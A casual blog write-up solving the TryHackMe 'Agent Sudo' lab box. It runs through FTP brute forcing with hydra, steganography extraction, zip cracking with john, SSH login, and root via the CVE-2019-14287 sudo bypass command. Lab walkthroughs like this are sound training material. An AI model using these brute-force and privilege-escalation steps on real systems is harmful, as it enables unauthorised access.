---
title: "Agent sudo"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

## Enumeration

```bash
PORT      STATE    SERVICE REASON      VERSION
21/tcp    open     ftp     syn-ack     vsftpd 3.0.3
22/tcp    open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp    open     http    syn-ack     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Annoucement
18101/tcp filtered unknown no-response
50001/tcp filtered unknown no-response
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

On the website :

```text
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

cool we have to change our user-agent

tried codename, sudo, agent R, R...

and R gave us something

```text
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

Lol so there are 25 employees and you can't be R...ok its a letter of the alphabet...lets FUZZ

A...B..C..is easy its like counting up to 3...sing a single melody...

I giggled on agent P too

only C and R have different content-length..and we cannot be R so...yeah

```text
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

There is always a chris in your team...he always do that

seems like the bruteforce is strong in here

We brutefore the ftp password with hydra

```bash
$hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.185.167 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-04 17:21:40
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.185.167:21/
[21][ftp] host: 10.10.185.167 login: chris password: crystal
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 9 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-04 17:22:58
```

`chris : crystal`

Next we grab all the stuff

`ftp> mget \*`

we got `To_agentJ.txt`

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

and two images :

{{< post-img src="cutie.png" alt="cutie" style="width:200px" >}}
{{< post-img src="cute-alien.jpg" alt="cute-alien" style="width:200px" >}}

Steganography it is

first are those really pictures?

```bash
$file \*

cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
```

There is no exif data...lets fire up `steghide`

```bash
steghide --extract -sf cutie.png
Entrez la passphrase:
```

Cutie asks for a passphrase..it may be in cute-alien

```bash
steghide --extract -sf cutie-alien.png
Entrez la passphrase:
```

actually no lets use `binwalk` then

```bash
$binwalk cute-alien.jpg

## DECIMAL HEXADECIMAL DESCRIPTION

0 0x0 JPEG image data, JFIF standard 1.01

┌─[nair0lf32@zer0ne]─[~/Desktop/Stuff/THM/Agent Sudo]
└──╼ $binwalk cutie.png

## DECIMAL HEXADECIMAL DESCRIPTION

0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
869 0x365 Zlib compressed data, best compression
34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820 0x8804 End of Zip archive, footer length: 22
```

Ok cutie.png got a zip archive

we extract it

```bash
$binwalk cutie.png -e

## DECIMAL HEXADECIMAL DESCRIPTION

0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
869 0x365 Zlib compressed data, best compression
34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820 0x8804 End of Zip archive, footer length: 22
```

We get a folder with a password protected zip...well its a bruteforce marathon as it seems

lets use zip2john then john with rockyou and the password is:

`alien (8702.zip/To_agentR.txt)`

Now we unzip the archive and read the text to agent R

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

This team have communication issues (even for secret agents)

`QXJlYTUx` in just base 64 for `Area51`

we use that final password to extract stuff from the second image with steghide

```bash
steghide info cute-alien.jpg
"cute-alien.jpg":
format: jpeg
capacit�: 1,8 KB
Essayer d'obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
Entrez la passphrase:
fichier � inclure "message.txt":
taille: 181,0 Byte
cryptage: rijndael-128, cbc
compression: oui
steghide --extract -sf cute-alien.jpg
Entrez la passphrase:
�criture des donn�es extraites dans "message.txt".
```

we got `message.txt`

We can now ssh with: `james:hackerrules!`

And we get the user flag

`james@agent-sudo:~$ cat user_flag.txt`

in the same folder there is ANOTHER PICTURE dammit! I think we might need that

```bash
$scp james@10.10.252.51:Alien_autospy.jpg /home/nair0lf32
james@10.10.252.51's password:
Alien_autospy.jpg
```

That one alien is not cute at all

{{< post-img src="Alien_autospy.jpg" alt="alien autopsy" style="width:200px" >}}

haha autospy (nice)

A reverse image search of the image reveals the:

`Roswell alien autopsy (de verdade)`

Time to PrivEsc

\*_mission impossible theme starts_

## Privilege Escalation

```bash
sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
(ALL, !root) /bin/bash
```

wait what? lol..lets google that

`CVE-2019-14287`

Read it..understand it...do it

`sudo -u#-1 /bin/bash`

```text
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
super_secret_flag_here

By,
DesKel a.k.a Agent R
```

Cool..there is a bonus for agent R identity..lets GO...
kek I am stupid, its just...`deskel`
That was a fun one
